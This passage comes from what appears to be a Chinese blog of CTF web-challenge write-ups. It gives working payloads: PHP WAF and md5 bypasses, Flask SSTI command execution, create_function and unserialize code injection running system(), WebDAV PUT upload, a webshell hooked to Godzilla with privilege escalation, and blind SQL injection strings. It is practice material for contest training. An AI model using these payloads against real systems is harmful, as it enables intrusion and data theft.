class="keyword">die</span>(<span class="string">&#x27;waf..&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;yulige&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(!(<span class="title function_ invoke__">substr</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;yulige&#x27;</span>], <span class="number">32</span>) === <span class="title function_ invoke__">md5</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;yulige&#x27;</span>])))&#123;         <span class="comment">//日爆md5!!!!!!</span></span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;waf..&#x27;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/nctfisfun$/&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;nctf&#x27;</span>]) &amp;&amp; <span class="variable">$_GET</span>[<span class="string">&#x27;nctf&#x27;</span>] !== <span class="string">&#x27;nctfisfun&#x27;</span>)&#123;</span><br><span class="line">            <span class="variable">$getflag</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$getflag</span>) &amp;&amp; <span class="variable">$getflag</span> === <span class="string">&#x27;ccc_liubi&#x27;</span>)&#123;</span><br><span class="line">            <span class="keyword">include</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">die</span>(<span class="string">&#x27;waf..&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>在这里首先对题目进行思路解析：</p><p>要以GET方法接收yulige参数，但是会被过滤</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if(preg_match(&#x27;/yulige|flag|nctf/i&#x27;, $_SERVER[&#x27;QUERY_STRING&#x27;]))  die(&#x27;waf..&#x27;);</span><br></pre></td></tr></table></figure><p>$_SERVER[‘QUERY_STRING’]匹配的是问号后的内容，且不会进行url解码，我们可以通过url编码绕过</p><p>但是上面又存在</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">if($_REQUEST)&#123;</span><br><span class="line">    foreach ($_REQUEST as $key =&gt; $value) &#123;</span><br><span class="line">        if(preg_match(&#x27;/[a-zA-Z]/i&#x27;, $value))   die(&#x27;waf..&#x27;);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>这会匹配使对yulige的传参不能有字母，这可不行啊！！</p><p>但是我们可以发现这只是$_REQUEST，如果同时get和post，post优先，会产生变量覆盖。</p><p>然后我们需要关注的就是这里的内容</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;yulige&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(!(<span class="title function_ invoke__">substr</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;yulige&#x27;</span>], <span class="number">32</span>) === <span class="title function_ invoke__">md5</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;yulige&#x27;</span>])))&#123;         <span class="comment">//日爆md5!!!!!!</span></span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;waf..&#x27;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/nctfisfun$/&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;nctf&#x27;</span>]) &amp;&amp; <span class="variable">$_GET</span>[<span class="string">&#x27;nctf&#x27;</span>] !== <span class="string">&#x27;nctfisfun&#x27;</span>)&#123;</span><br><span class="line">            <span class="variable">$getflag</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$getflag</span>) &amp;&amp; <span class="variable">$getflag</span> === <span class="string">&#x27;ccc_liubi&#x27;</span>)&#123;</span><br><span class="line">            <span class="keyword">include</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">die</span>(<span class="string">&#x27;waf..&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先要绕过md5的比较，要让自己的前32位强等于自己的md5值，采用数组绕过。因为都为NULL</p><p>然后后面的就太简单了，给出payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://node4.anna.nssctf.cn:28809/?%79%75%6C%69%67%65[]=123&amp;%6E%63%74%66=nnct%66isfun&amp;%66%6C%61%67=data://text/plain,ccc_liubi</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yulige=123&amp;nctf=1&amp;flag=2</span><br></pre></td></tr></table></figure><h2 id="NSSRound-1-Basic-basic-check"><a href="#NSSRound-1-Basic-basic-check" class="headerlink" title="[NSSRound#1 Basic]basic_check"></a>[NSSRound#1 Basic]basic_check</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);<span class="comment">// Welcome to NSSCTF Round#1 Basic, have fun. </span></span><br></pre></td></tr></table></figure><p>一道奇奇怪怪的题，之前没有见过，除了这个就啥都没有了，目录也什么都扫不到。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\TY&gt;curl -I -X OPTIONS <span class="string">&quot;node4.anna.nssctf.cn:28934/index.php&quot;</span></span><br><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Date: Mon, 02 Dec 2024 11:09:33 GMT</span><br><span class="line">Server: Apache/2.4.38 (Debian)</span><br><span class="line">DAV: 1,2</span><br><span class="line">DAV: &lt;http://apache.org/dav/propset/fs/1&gt;</span><br><span class="line">MS-Author-Via: DAV</span><br><span class="line">Allow: OPTIONS,GET,HEAD,POST,DELETE,TRACE,PROPFIND,PROPPATCH,COPY,MOVE,PUT,LOCK,UNLOCK</span><br><span class="line">Content-Length: 0</span><br></pre></td></tr></table></figure><p><strong><code>-X OPTIONS</code></strong></p><p><code>-X OPTIONS</code> 指定了请求的方法为 <code>OPTIONS</code>，这是 HTTP 的一种方法，常用于查询服务器支持的 HTTP 方法（如 <code>GET</code>、<code>POST</code>、<code>PUT</code> 等）。</p><p>这条命令的作用是向 <code>node4.anna.nssctf.cn:28934/index.php</code> 发送一个 <code>OPTIONS</code> 请求，并显示响应头。</p><p><strong>再说一下PUT、DELETE请求，PUT、DELETE请求本身最初是用来进行文件管理的，当然这个请求如果为进行鉴权处理的话就会任意执行修改和删除，PUT请求，如果不存在这个路径下的文件，将会创建，如果存在，会执行覆盖操作</strong></p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241202191229996.png" alt="image-20241202191229996" style="zoom:67%;" /><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241202191236455.png" alt="image-20241202191236455" style="zoom: 80%;" /><p>拿捏了</p><p>NSSCTF{031e835f-af6a-447d-838d-6d5e5b640e8e}</p><h2 id="GDOUCTF-2023-hate-eat-snake"><a href="#GDOUCTF-2023-hate-eat-snake" class="headerlink" title="[GDOUCTF 2023]hate eat snake"></a>[GDOUCTF 2023]hate eat snake</h2><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241202192140294.png" alt="image-20241202192140294" style="zoom:50%;" /><p>一道js题目，这种题一般直接给了flag在源码里，但是我找不到。这里刚开始是打不开源码的</p><p>这里可以右键-&gt;检查</p><p>先复制网页url，打开f12，再输入网址打开网页，这样f12就会保留</p><p><a href="https://so.csdn.net/so/search?q=%E7%81%AB%E7%8B%90%E6%B5%8F%E8%A7%88%E5%99%A8&spm=1001.2101.3001.7020">火狐浏览器</a>右边的三横-&gt;更多工具-&gt;开发者工具。</p><p>三种方法打开f12</p><p>接下来分析题目</p><p>这种js的网页，flag一般都是alert给你，那么我们接下来搜一下alert函数</p><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241202192401696.png" alt="image-20241202192401696"></p><p>不出意外这就是flag了。前面有个if比较，跟进一下getScore</p><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241202192427751.png" alt="image-20241202192427751"></p><p>那么只要让这个return的score值超级大就行，84行打断点然后空格运行游戏</p><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241202192500153.png" alt="image-20241202192500153"></p><p>然后来控制台改score的值</p><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241202192515347.png" alt="image-20241202192515347"></p><p>回车重新运行后alert出flag</p><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241202192532428.png" alt="image-20241202192532428"></p><h2 id="NCTF-2018-Flask-PLUS"><a href="#NCTF-2018-Flask-PLUS" class="headerlink" title="[NCTF 2018]Flask PLUS"></a>[NCTF 2018]Flask PLUS</h2><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241202195010229.png" alt="image-20241202195010229"></p><p>这题本来想着用fenjing，但是这种格式的好像用不太了fenjing</p><p>Aura给出一个方法：</p><blockquote><p>可以先把黑名单fuzz出来，本地开一个server跑出来payload，再拼上去</p></blockquote><p>虽然但是这道题比较简单直接手动了。</p><p>这里给出payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;lipsum.__globals__[&#x27;o&#x27;&#x27;s&#x27;][&#x27;pop&#x27;&#x27;en&#x27;](&#x27;tac /Th1s_is__F1114g&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure><h2 id="NISACTF-2022-level-up"><a href="#NISACTF-2022-level-up" class="headerlink" title="[NISACTF 2022]level-up"></a>[NISACTF 2022]level-up</h2><p>一共有五个level，第一关是目录扫描，扫出robots.txt即可。</p><p>第二关md5碰撞，简单</p><p>第三关sha1碰撞，都是有笔记的，简单。</p><p>第四关看看</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">include</span> <span class="string">&quot;str.php&quot;</span>;</span><br><span class="line">    <span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$str</span> = <span class="title function_ invoke__">parse_url</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_URI&#x27;</span>]);</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$str</span>[<span class="string">&#x27;query&#x27;</span>] == <span class="string">&quot;&quot;</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;give me a parameter&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/ |_|20|5f|2e|\./&#x27;</span>,<span class="variable">$str</span>[<span class="string">&#x27;query&#x27;</span>]))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;blacklist here&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;NI_SA_&#x27;</span>] === <span class="string">&quot;txw4ever&quot;</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="variable">$level5</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;level 4 failed ...&quot;</span>);</span><br><span class="line">    &#125; </span><br></pre></td></tr></table></figure><p><code>$_SERVER[&#39;REQUEST_URI&#39;]</code> 是一个 PHP 超全局变量，表示当前请求的 URI（Uniform Resource Identifier）。它提供了客户端请求的完整 URI，包括路径和查询字符串部分。</p><blockquote><p><a href="http://example.com/test/page.php?name=John&age=30">http://example.com/test/page.php?name=John&amp;age=30</a></p><p>输出</p><p>&#x2F;test&#x2F;page.php?name&#x3D;John&amp;age&#x3D;30</p></blockquote><p>而下划线用加号绕过即可。</p><p>最后是level5</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//sorry , here is true last level</span></span><br><span class="line"><span class="comment">//^_^</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;str.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line"><span class="variable">$b</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^[a-z0-9_]*$/isD&#x27;</span>,<span class="variable">$a</span>))&#123;</span><br><span class="line">    <span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$a</span>(<span class="string">&#x27;&#x27;</span>,<span class="variable">$b</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里就要用到create_function</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">注释掉create_function()格式后面的’&#125;&#x27;,防止报错</span><br><span class="line"></span><br><span class="line">#create_function(‘$a’, ‘echo(“hello”);’)的实现逻辑如下：</span><br><span class="line">function niming($a)</span><br><span class="line">&#123;</span><br><span class="line">echo(“hello”);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">题目里的payload就是下面这个</span><br><span class="line">function niming()</span><br><span class="line">&#123;</span><br><span class="line">&#125;system(‘cat /flag’);//&#125;</span><br></pre></td></tr></table></figure><p>因此这里的payload为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?a=\create_function&amp;b=&#125;system(&#x27;ls /&#x27;);//</span><br></pre></td></tr></table></figure><p>这里的反斜杠是绕过preg_match，同时转义c，不会对函数造成影响。</p><h2 id="HUBUCTF-2022-新生赛-Calculate"><a href="#HUBUCTF-2022-新生赛-Calculate" class="headerlink" title="[HUBUCTF 2022 新生赛]Calculate"></a>[HUBUCTF 2022 新生赛]Calculate</h2><p>一道计算题，用python解题</p><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241203142059441.png" alt="image-20241203142059441"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url=<span class="string">&#x27;http://node5.anna.nssctf.cn:26952/&#x27;</span></span><br><span class="line">sess=requests.session()</span><br><span class="line">res=sess.get(url)</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    arg=re.findall(<span class="string">&#x27;&lt;div style=&quot;display:inline;color:#.&#123;6&#125;&quot;&gt;(.)&lt;/div&gt;&#x27;</span>,res.text)</span><br><span class="line">    question=<span class="string">&#x27;&#x27;</span>.join(arg)</span><br><span class="line">    <span class="built_in">print</span>(question)</span><br><span class="line">    answer=<span class="built_in">eval</span>(question[:-<span class="number">1</span>])</span><br><span class="line">    <span class="built_in">print</span>(answer)</span><br><span class="line">    time.sleep(<span class="number">1</span>)</span><br><span class="line">    res=sess.post(url,data=&#123;<span class="string">&#x27;ans&#x27;</span>:answer&#125;)</span><br><span class="line">    <span class="built_in">print</span>(res.text)</span><br></pre></td></tr></table></figure><h2 id="FSCTF-2023-CanCanNeed"><a href="#FSCTF-2023-CanCanNeed" class="headerlink" title="[FSCTF 2023]CanCanNeed"></a>[FSCTF 2023]CanCanNeed</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Noteasy</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$param1</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$param2</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$a</span>=<span class="variable language_">$this</span>-&gt;param1;</span><br><span class="line">        <span class="variable">$b</span>=<span class="variable language_">$this</span>-&gt;param2;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/fil|cat|more|tail|tac|less|head|nl|tailf|ass|eval|sort|shell|ob|start|mail|\`|\&#123;|\%|x|\&amp;|\*|\||\&lt;|\&quot;|\&#x27;|\=|\?|sou|\.|log|scan|chr|local|sess|b2|id|show|cont|high|reverse|flip|rand|source|arra|head|light|print|echo|read|inc|flag|1f|info|bin|hex|oct|pi|con|rot|input|y2f/i&#x27;</span>, <span class="variable">$this</span>-&gt;param2)) &#123; </span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;this param is error!&#x27;</span>); </span><br><span class="line">        &#125; <span class="keyword">else</span> &#123; </span><br><span class="line">            <span class="variable">$a</span>(<span class="string">&#x27;&#x27;</span>, <span class="variable">$b</span>); </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;    </span><br><span class="line">    <span class="title function_ invoke__">show_source</span>(<span class="string">&#x27;index.php&#x27;</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Hi!Welcome to FSCTF2023!&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span>&#123; </span><br><span class="line">    <span class="variable">$file</span>=<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]); </span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$file</span>); &#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p>一眼丁真，create_function</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Noteasy</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$param1</span>=<span class="string">&#x27;create_function&#x27;</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$param2</span>=<span class="string">&#x27;&#125;system($_POST[jwk]);//&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title class_">Noteasy</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br></pre></td></tr></table></figure><p>拿捏</p><p>还有一种方法</p><p>直接require也行</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Noteasy</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$param1</span>=<span class="string">&#x27;create_function&#x27;</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$param2</span>=<span class="string">&#x27;&#125;require(base64_decode(ZmlsZTovLy9mbGFn));//&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title class_">Noteasy</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br></pre></td></tr></table></figure><h2 id="湖湘杯-2021-final-Penetratable"><a href="#湖湘杯-2021-final-Penetratable" class="headerlink" title="[湖湘杯 2021 final]Penetratable"></a>[湖湘杯 2021 final]Penetratable</h2><p>有注册登录界面，有root用户，admin用户</p><p>尝试越权改root密码，权限不够，改admin可以，猜测root只有admin可以改，那么接下来就要获得admin权限。这里直接用admin账号登录是改不了的，被禁用了。</p><p>Information界面会将信息回显到界面，那么尝试二次注入</p><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241203150323022.png" alt="image-20241203150323022"></p><p>这里直接修改密码，修改的就是admin用户的密码！</p><p>然后发现按钮不能按，f12看一下就好，自己构造数据包，这里直接看js源码就行了，里面都有</p><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241203151646902.png" alt="image-20241203151646902"></p><p>root密码成功修改成123456，登陆一下看看。</p><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241203151737374.png" alt="image-20241203151737374"></p><p>成功登录，多了一个文件下载的功能点</p><p>抓一下包看看</p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241203151855387.png" alt="image-20241203151855387" style="zoom:67%;" /><p>看看能不能任意文件下载。</p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241203152039720.png" alt="image-20241203152039720" style="zoom: 67%;" /><p>目录穿越漏洞~</p><p>之前扫源码扫到过phpinfo.php，那就读取一下试试。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">md5</span>(@<span class="variable">$_GET</span>[<span class="string">&#x27;pass_31d5df001717&#x27;</span>])===<span class="string">&#x27;3fde6bb0541387e4ebdadf7c2ff31123&#x27;</span>)&#123;@<span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cc&#x27;</span>]);&#125; </span><br><span class="line"><span class="comment">// hint: Checker will not detect the existence of phpinfo.php, please delete the file when fixing the vulnerability.</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241203152536667.png" alt="image-20241203152536667"></p><p>正常情况下，我们应该是可以直接拿到&#x2F;flag的内容的，但是这里！！他居然不让我读！权限太低了，那么接下来要做的就是提权！</p><p>先上线哥斯拉！</p><p>这里注意一个问题，他的密码cc是GET类型传参的，这不能被webshell管理工具利用，那么我们cc&#x3D;eval($_POST[1]);然后把1当作密码即可。</p><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241203153252371.png" alt="image-20241203153252371"></p><p>实锤了！</p><p>提权吧接下来<br><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241203154849744.png" alt="image-20241203154849744"></p><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241203155021110.png" alt="image-20241203155021110"></p><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241203155429796.png" alt="image-20241203155429796"></p><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241203155415823.png" alt="image-20241203155415823"></p><p>拿捏！</p><h2 id="CISCN-2022-初赛-ezpop"><a href="#CISCN-2022-初赛-ezpop" class="headerlink" title="[CISCN 2022 初赛]ezpop"></a>[CISCN 2022 初赛]ezpop</h2><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241203163625594.png" alt="image-20241203163625594"></p><p>用phpggc试了半天结果不行，不知道为啥</p><p>只能自己跟了，跟打0day一样。。。。不过挺好的</p><p>详情看笔记！！！说白了直接用exp就行</p><h2 id="NSSCTF-2022-Spring-Recruit-babysql"><a href="#NSSCTF-2022-Spring-Recruit-babysql" class="headerlink" title="[NSSCTF 2022 Spring Recruit]babysql"></a>[NSSCTF 2022 Spring Recruit]babysql</h2><p>一道布尔盲注，这里给出payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">tarnish&#x27;&amp;&amp;(ascii(substr((select/**/database()),&#123;&#125;,1))&gt;&#123;&#125;)&amp;&amp;/**/&#x27;1&#x27;=&#x27;1</span><br><span class="line"></span><br><span class="line">tarnish&#x27;&amp;&amp;(ascii(substr((select/**/group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema=database()),&#123;&#125;,1))&gt;&#123;&#125;)&amp;&amp;/**/&#x27;1&#x27;=&#x27;1</span><br><span class="line"></span><br><span class="line">tarnish&#x27;&amp;&amp;(ascii(substr((select/**/group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_table=&#x27;flag&#x27;),&#123;&#125;,1))&gt;&#123;&#125;)&amp;&amp;/**/&#x27;1&#x27;=&#x27;1</span><br><span class="line"></span><br><span class="line">tarnish&#x27;&amp;&amp;(ascii(substr((select/**/flag/**/from/**/flag),&#123;&#125;,1))&gt;&#123;&#125;)&amp;&amp;/**/&#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span 